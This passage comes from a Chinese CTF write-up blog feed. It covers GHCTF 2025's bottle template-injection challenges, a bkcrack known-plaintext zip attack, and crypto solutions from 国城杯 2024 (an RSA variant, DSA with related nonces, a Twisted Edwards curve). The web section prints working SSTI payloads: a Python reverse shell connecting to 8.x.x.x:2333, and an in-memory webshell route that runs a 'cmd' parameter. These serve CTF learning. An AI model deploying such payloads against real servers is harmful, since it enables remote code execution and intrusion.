class="subst">&#123;message_items&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> board</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">return</span> message.replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> template(handle_message(messages))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Clean&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Clean</span>():</span><br><span class="line">    <span class="keyword">global</span> messages</span><br><span class="line">    messages = []</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;window.location.href=&quot;/&quot;&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/submit&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>():</span><br><span class="line">    message = waf(request.forms.get(<span class="string">&#x27;message&#x27;</span>))</span><br><span class="line">    messages.append(message)</span><br><span class="line">    <span class="keyword">return</span> template(handle_message(messages))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run(app, host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">9000</span>)</span><br></pre></td></tr></table></figure><p>审一下代码，发现有<strong>过滤花括号</strong>的<code>waf</code>，以及<code>template</code><strong>模板渲染</strong></p><p>试了一下，发现可以<code>xss</code>，并且内容留在了前端页面上，话说<code>xss</code>这种打法除了<strong>cookie外带</strong>这种我好像没见过什么其他操作了()</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-card&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-content&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">&quot;message-time&quot;</span>&gt;</span>#1 - 刚刚<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-card&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;message-content&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">&quot;message-time&quot;</span>&gt;</span>#2 - 刚刚<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以考虑闭合<code>&lt;/div&gt;</code>，题目用是<code>bottle</code>，不妨看看有没有<strong>bottle模板注入</strong></p><p>看一下<a href="https://googlegroups.com/group/bottlepy/attach/60ddc96375306a0e/bottle-zh-cn.pdf?part=0.1">官方文档</a>，可以嵌入<strong>python代码</strong>，以<code>%</code>开始</p><p>所谓闭合，就是我们自己填上里面的<code>&lt;div&gt;</code>的后半部分使得最外面的<code>&lt;div&gt;</code>成为完整的一部分，然后剩下的<code>&lt;/div&gt;</code>我们需要补上它的<code>&lt;div&gt;头</code>，然后我们就可以在二者之间插入我们的<strong>恶意python代码</strong>了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;cat /flag&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;cat /flag &gt; 1.txt&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%include(<span class="string">&quot;1.txt&quot;</span>)</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我想试试反弹shell，直接找了一个payload，好像失败了</span></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;8.x.x.x&#x27;,2333));[os.dup2(s.fileno(),i) for i in range(3)];p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;])&quot;</span></span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面两个是官方payload</span></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">%__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((\&quot;8.x.x.x\&quot;,2333));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&quot;sh\&quot;)&#x27;&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内存马</span></span><br><span class="line">&lt;/div&gt;&lt;small class=<span class="string">&quot;message-time&quot;</span>&gt;<span class="comment">#1 - 刚刚&lt;/small&gt;&lt;/div&gt;</span></span><br><span class="line">% from bottle import Bottle, request</span><br><span class="line">% app=__import__(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>]</span><br><span class="line">% app.route(<span class="string">&quot;/shell&quot;</span>,<span class="string">&quot;GET&quot;</span>,lambda :__import__(<span class="string">&#x27;os&#x27;</span>).popen(request.params.get(<span class="string">&#x27;cmd&#x27;</span>)).<span class="built_in">read</span>())</span><br><span class="line">&lt;div class=<span class="string">&quot;message-card&quot;</span>&gt;&lt; class=<span class="string">&quot;message-content&quot;</span>&gt;123</span><br></pre></td></tr></table></figure><p><a href="https://forum.butian.net/share/4048">内存马</a></p><p>是需要闭合的吧，但是出题人那好像没写</p><h2 id="Message-in-a-Bottle-plus"><a href="#Message-in-a-Bottle-plus" class="headerlink" title="Message in a Bottle plus"></a>Message in a Bottle plus</h2><p>是个黑盒题，发现了<code>%</code>直接就触发了<code>waf</code>，然后出题人这里说是，白名单之后加了一些<code>AST</code>的语法检测，在我们语法报错的时候会变量替换</p><p>在<code>python</code>里<code>% xxx</code>这本身就是一个错误的语法，为了让它可以通过语法检测(然而语法检测这种东西肯定针对的是代码)，将它变成<strong>字符串</strong>就可以了，所以用引号包裹就可以绕过<code>AST</code>的检测</p><p><code>payload</code>的话，这里好像只有<strong>内存马</strong>生效了，其他的可以多试几次就可以了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">% from bottle import Bottle, request</span></span><br><span class="line"><span class="string">% app=__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]</span></span><br><span class="line"><span class="string">% app.route(&quot;/shell&quot;,&quot;GET&quot;,lambda :__import__(&#x27;os&#x27;).popen(request.params.get(&#x27;cmd&#x27;)).read())</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="mybrave"><a href="#mybrave" class="headerlink" title="mybrave"></a>mybrave</h2><p>先爆破一下密码，发现好像爆不出来，然后注意到压缩包里面是图片，使用<strong>bkcrack进行已知明文攻击</strong>(这里是符合攻击条件的)，因为<strong>png头是固定的</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\bkcrack.exe -C .\mybrave.zip -c mybrave.png -x 0 89504E470D0A1A0A0000000D49484452</span><br><span class="line"></span><br><span class="line">.\bkcrack.exe -C .\mybrave.zip -c mybrave.png -k 97d30dcc 173b15a8 6e0e7455 -r 1..12 ?p</span><br><span class="line"></span><br><span class="line">.\bkcrack.exe -C .\mybrave.zip -c mybrave.png -k 97d30dcc 173b15a8 6e0e7455 -d mybrave.png</span><br></pre></td></tr></table></figure><p>一开始爆12位密码无果，还是直接恢复出来吧<br>提取图片尾的字符<strong>解base64</strong>即可</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://seandictionary.top/ghctf-2025/">https://seandictionary.top/ghctf-2025/</a></li><li><a href="https://tover.xyz/">https://tover.xyz/</a></li><li><a href="https://tangcuxiaojikuai.xyz/">https://tangcuxiaojikuai.xyz/</a></li><li><a href="https://suhanhan-cpu.github.io/2025/03/19/2025%20GHCTF%20Writeup/">https://suhanhan-cpu.github.io/2025/03/19/2025%20GHCTF%20Writeup/</a></li><li><a href="https://mp.weixin.qq.com/s/03Bq8iryo22Cme5QR0LqDw">https://mp.weixin.qq.com/s/03Bq8iryo22Cme5QR0LqDw</a></li><li><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18296185">https://www.cnblogs.com/EddieMurphy-blogs/p/18296185</a></li><li><a href="https://xyaxxya.github.io/posts/2b7eb6e9.html">https://xyaxxya.github.io/posts/2b7eb6e9.html</a></li><li><a href="https://hyggevv.github.io/2025/03/07/GHCTF2025">https://hyggevv.github.io/2025/03/07/GHCTF2025</a></li></ul><p>唉，也只能四处抄抄学学了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;诶，这里有老登偷偷炸鱼(bushi&lt;/p&gt;
&lt;h1 id=&quot;Crypto&quot;&gt;&lt;a href=&quot;#Crypto&quot; class=&quot;headerlink&quot; title=&quot;Crypto&quot;&gt;&lt;/a&gt;Crypto&lt;/h1&gt;&lt;p&gt;无意中发现了一个&lt;strong&gt;在线Sagemath运行平</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>国城杯&amp;&amp;HECTF2024</title>
    <link href="https://hvang10.github.io/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF-HECTF2024/"/>
    <id>https://hvang10.github.io/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF-HECTF2024/</id>
    <published>2024-12-08T15:48:30.000Z</published>
    <updated>2025-04-10T15:19:27.394Z</updated>
    
    <content type="html"><![CDATA[<h1 id="国城杯"><a href="#国城杯" class="headerlink" title="国城杯"></a>国城杯</h1><p>这次比赛的<code>web</code>比较有难度(题解居然比<code>pwn</code>少，而且是少很多很多)，交给学弟，然后学弟下午出去玩，那就没人打<code>web</code>了，因为我被<code>圆锥曲线</code>卡住了QWQ</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;D0g3xGC&#123;****************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">p, q</span>):</span><br><span class="line">    public_key = p*p*q</span><br><span class="line">    e = public_key</span><br><span class="line">    n = p*q</span><br><span class="line">    phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    private_key = inverse(e,phi_n)</span><br><span class="line">    <span class="keyword">return</span> public_key,private_key,e</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">N,d,e = gen_key(p,q)</span><br><span class="line"></span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489</span></span><br><span class="line"><span class="string">d = 58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009</span></span><br><span class="line"><span class="string">c = 82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>Schmidt Samoa</code>密码体系，见<a href="https://hvang10.github.io/2024/05/10/%E5%A4%8D%E7%8E%B0%E8%AE%A1%E5%88%92%E2%80%94%E2%80%94NewStarCTF-2023/">crypto-week4-RSA Variation II</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = <span class="number">539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489</span></span><br><span class="line">d = <span class="number">58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009</span></span><br><span class="line">c = <span class="number">82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175</span></span><br><span class="line">pq = GCD(<span class="built_in">pow</span>(<span class="number">2</span>, d*N, N)-<span class="number">2</span>, N)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c, d, pq))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="EZ-sign"><a href="#EZ-sign" class="headerlink" title="EZ_sign"></a>EZ_sign</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> random,os</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;D0g3xGC&#123;***************&#125;&#x27;</span></span><br><span class="line">msg = <span class="string">b&#x27;e = ?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">pub, pri, k</span>):</span><br><span class="line">    (p,q,g,y) = pub</span><br><span class="line">    x = pri</span><br><span class="line">    r = <span class="built_in">int</span>(powmod(g, k, p) % q)</span><br><span class="line">    H = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">    s = <span class="built_in">int</span>((H + r * x) * invert(k, q) % q)</span><br><span class="line">    <span class="keyword">return</span> (H,r,s)</span><br><span class="line"></span><br><span class="line">k1 = getPrime(<span class="number">64</span>)</span><br><span class="line">k2 = k1 ** <span class="number">2</span></span><br><span class="line">pri = bytes_to_long(msg)</span><br><span class="line">a = <span class="number">149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203</span></span><br><span class="line">b = <span class="number">829396411171540475587755762866203184101195238207</span></span><br><span class="line">g = <span class="number">87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397</span></span><br><span class="line">y = <span class="number">97644672217092534422903769459190836176879315123054001151977789291649564201120414036287557280431608390741595834467632108397663276781265601024889217654490419259208919898180195586714790127650244788782155032615116944102113736041131315531765220891253274685646444667344472175149252120261958868249193192444916098238</span></span><br><span class="line"></span><br><span class="line">pub = (a, b, g, y)</span><br><span class="line"></span><br><span class="line">H1, r1, s1 = sign(pub, pri, k1)</span><br><span class="line"></span><br><span class="line">H2, r2, s2 = sign(pub, pri, k2)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p * q</span><br><span class="line">c = powmod(bytes_to_long(flag), e, n)</span><br><span class="line"></span><br><span class="line">C = p**<span class="number">2</span> + q**<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;(H1, r1, s1) = <span class="subst">&#123;H1&#125;</span>, <span class="subst">&#123;r1&#125;</span>, <span class="subst">&#123;s1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;(H2, r2, s2) = <span class="subst">&#123;H2&#125;</span>, <span class="subst">&#123;r2&#125;</span>, <span class="subst">&#123;s2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(C)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(H1, r1, s1) = 659787401883545685817457221852854226644541324571, 334878452864978819061930997065061937449464345411, 282119793273156214497433603026823910474682900640</span></span><br><span class="line"><span class="string">(H2, r2, s2) = 156467414524100313878421798396433081456201599833, 584114556699509111695337565541829205336940360354, 827371522240921066790477048569787834877112159142</span></span><br><span class="line"><span class="string">c = 18947793008364154366082991046877977562448549186943043756326365751169362247521</span></span><br><span class="line"><span class="string">C = 179093209181929149953346613617854206675976823277412565868079070299728290913658</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>熟悉的签名——<code>DSA</code>，找了一圈，找到了<code>关系k攻击</code><br><img src="https://pic1.zhimg.com/80/v2-b9a34619a42f211a202b8fab91dd542a_1440w.png" alt=""><br><a href="http://www.cynthia99.link/index.php/archives/2426/">参考博客</a></p><p>现在差个平方和待解决，本来想用<code>sage</code>自带的<code>two_squares</code>，但出来的两个都不是素数，就很奇怪，说明这里的分解应该是没有满足特定的条件</p><p>那只能换一个打法了<br><a href="https://xz.aliyun.com/t/15424">解丢番图方程</a><br>貌似还有一个打法——<code>复数的模长</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.solvers.diophantine.diophantine <span class="keyword">import</span> cornacchia</span><br><span class="line"></span><br><span class="line">p = <span class="number">149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203</span></span><br><span class="line">q = <span class="number">829396411171540475587755762866203184101195238207</span></span><br><span class="line">g = <span class="number">87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397</span></span><br><span class="line">y = <span class="number">97644672217092534422903769459190836176879315123054001151977789291649564201120414036287557280431608390741595834467632108397663276781265601024889217654490419259208919898180195586714790127650244788782155032615116944102113736041131315531765220891253274685646444667344472175149252120261958868249193192444916098238</span></span><br><span class="line"></span><br><span class="line">(H1, r1, s1) = <span class="number">659787401883545685817457221852854226644541324571</span>, <span class="number">334878452864978819061930997065061937449464345411</span>, <span class="number">282119793273156214497433603026823910474682900640</span></span><br><span class="line">(H2, r2, s2) = <span class="number">156467414524100313878421798396433081456201599833</span>, <span class="number">584114556699509111695337565541829205336940360354</span>, <span class="number">827371522240921066790477048569787834877112159142</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(GF(q))</span><br><span class="line"></span><br><span class="line">f = s2*x^<span class="number">2</span>*r1 - s1*x*r2 - H2*r1 + H1*r2</span><br><span class="line"></span><br><span class="line">k = <span class="built_in">int</span>(f.roots()[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">x = (s1*k - H1) * inverse(r1, q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(x).decode())</span><br><span class="line">c = <span class="number">18947793008364154366082991046877977562448549186943043756326365751169362247521</span></span><br><span class="line">C = <span class="number">179093209181929149953346613617854206675976823277412565868079070299728290913658</span></span><br><span class="line">x1 = cornacchia(<span class="number">1</span>, <span class="number">1</span>, C)</span><br><span class="line"><span class="keyword">for</span> a, b <span class="keyword">in</span> x1:</span><br><span class="line">    <span class="keyword">assert</span> a**<span class="number">2</span>+b**<span class="number">2</span> == C</span><br><span class="line">    <span class="keyword">if</span> isPrime(a) <span class="keyword">and</span> isPrime(b):</span><br><span class="line">        p, q = a, b</span><br><span class="line">        <span class="built_in">print</span>(p,q)</span><br><span class="line">        n = p*q</span><br><span class="line">        phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        d = inverse(e, phi)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)).decode())</span><br></pre></td></tr></table></figure><p>emmm，后面比较了一下时间，在复数域下分解所需的时间是短很多的，原题可见<strong>Geek Challenge 2023 EzComplex</strong><br>$N=(p+qi)*(p-qi)$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pq</span>(<span class="params">N</span>):</span><br><span class="line">    <span class="comment">#将 N 转换为复数域上的整数</span></span><br><span class="line">    f = ZZ[I](N)</span><br><span class="line">    <span class="comment">#获取所有因子</span></span><br><span class="line">    divisors_f = divisors(f)</span><br><span class="line">    <span class="comment">#遍历所有因子，寻找满足条件的p和q</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> divisors_f:</span><br><span class="line">        a,b = d.real(), d.imag()</span><br><span class="line">        <span class="keyword">if</span> a**<span class="number">2</span> + b**<span class="number">2</span> == N:</span><br><span class="line">            p = <span class="built_in">abs</span>(<span class="built_in">int</span>(a))</span><br><span class="line">            q = <span class="built_in">abs</span>(<span class="built_in">int</span>(b))</span><br><span class="line">            <span class="keyword">if</span> is_prime(p) <span class="keyword">and</span> is_prime(q):</span><br><span class="line">                <span class="keyword">return</span> p,q</span><br></pre></td></tr></table></figure><h3 id="Curve"><a href="#Curve" class="headerlink" title="Curve"></a>Curve</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sagemath</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">P, Q</span>):</span><br><span class="line">    (x1, y1) = P</span><br><span class="line">    (x2, y2) = Q</span><br><span class="line"></span><br><span class="line">    x3 = (x1*y2 + y1*x2) * inverse(<span class="number">1</span> + d*x1*x2*y1*y2, p) % p</span><br><span class="line">    y3 = (y1*y2 - a*x1*x2) * inverse(<span class="number">1</span> - d*x1*x2*y1*y2, p) % p</span><br><span class="line">    <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">x, P</span>):</span><br><span class="line">    Q = (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            Q = add(Q, P)</span><br><span class="line">        P = add(P, P)</span><br><span class="line">        x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line">p = <span class="number">64141017538026690847507665744072764126523219720088055136531450296140542176327</span></span><br><span class="line">a = <span class="number">362</span></span><br><span class="line">d = <span class="number">7</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">gx=bytes_to_long(<span class="string">b&#x27;D0g3xGC&#123;*****************&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">PR.&lt;y&gt;=PolynomialRing(Zmod(p))</span><br><span class="line">f=(d*gx^<span class="number">2</span>-<span class="number">1</span>)*y^<span class="number">2</span>+(<span class="number">1</span>-a*gx^<span class="number">2</span>)</span><br><span class="line">gy=<span class="built_in">int</span>(f.roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (a*gx^<span class="number">2</span>+gy^<span class="number">2</span>)%p==(<span class="number">1</span>+d*gx^<span class="number">2</span>*gy^<span class="number">2</span>)%p</span><br><span class="line"></span><br><span class="line">G=(gx,gy)</span><br><span class="line"></span><br><span class="line">eG = mul(e, G)</span><br><span class="line"><span class="built_in">print</span>(eG)</span><br><span class="line"></span><br><span class="line"><span class="comment">#eG = (34120664973166619886120801966861368419497948422807175421202190709822232354059, 11301243831592615312624457443883283529467532390028216735072818875052648928463)</span></span><br></pre></td></tr></table></figure><p>考点：<code>爱德华扭曲曲线</code></p><p>$ax^{2}+y^{2}\equiv 1+dx^{2}y^{2}(mod\ p)$</p><p><code>圆锥曲线</code>(不是椭圆曲线！！！)，吐了，然后去找了大半圈，没找到一篇能利用的</p><p>关于曲线的话，上一次印象比较深刻的是，羊城杯的两题椭圆曲线，然后也去看了一下，顺便复习一下，也是没能有进展，而且网上是比较少关于圆锥曲线的介绍的(有这玩意吗？我当时的想法就是这样的)<br>其实我应该想到映射这玩意的(属于是马后炮了)</p><p>赛后<code>Lst4r师傅</code>告诉我是这个<a href="https://en.wikipedia.org/wiki/Twisted_Edwards_curve">Twisted_Edwards_curve</a></p><p>我问他当时咋想到这个的，他说是羊城杯的时候，做那两题椭圆曲线的时候，翻到的，见过，所以有印象，好好好</p><p>然后解题脚本<a 